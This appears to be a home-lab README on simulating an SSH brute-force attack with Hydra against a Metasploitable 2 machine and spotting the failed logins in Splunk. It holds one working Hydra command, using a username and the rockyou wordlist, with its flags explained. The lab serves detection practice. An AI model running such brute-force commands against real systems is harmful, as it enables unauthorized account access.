# 🔐 SSH Brute Force Attack using Hydra

## 🎯 Objective
Simulate a brute-force SSH attack on Metasploitable 2 using Hydra and detect the failed login attempts using Splunk.

---

## 🛠️ Tools & Setup

| Tool           | Role                                |
|----------------|-------------------------------------|
| Hydra (Kali)   | Performs brute-force on SSH login   |
| Metasploitable | Exposes SSH service (port 22)       |
| Splunk (Windows)| Monitors logs via rsyslog (UDP 514) |

- **Target IP (Metasploitable)**: `192.168.56.105`
- **Attacker IP (Kali)**: `192.168.56.103`
- **Splunk IP**: `192.168.56.104`

> 🔧 Ensure `rsyslog` is configured properly to forward logs from Metasploitable to Splunk.

---

## ⚔️ Attack Command (Hydra - SSH)

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.105 -V -f 




#💡 Explanation:
-l msfadmin: Username on Metasploitable
-P rockyou.txt: Password list
ssh://: Target protocol (port 22)
-V: Verbose mode
-f: Stop after a valid credential is found






✅ Result
Attack executed with Hydra over SSH
Syslog data collected from Metasploitable
Detection query confirms failed login patterns
Can be visualized via a Splunk dashboard or alert
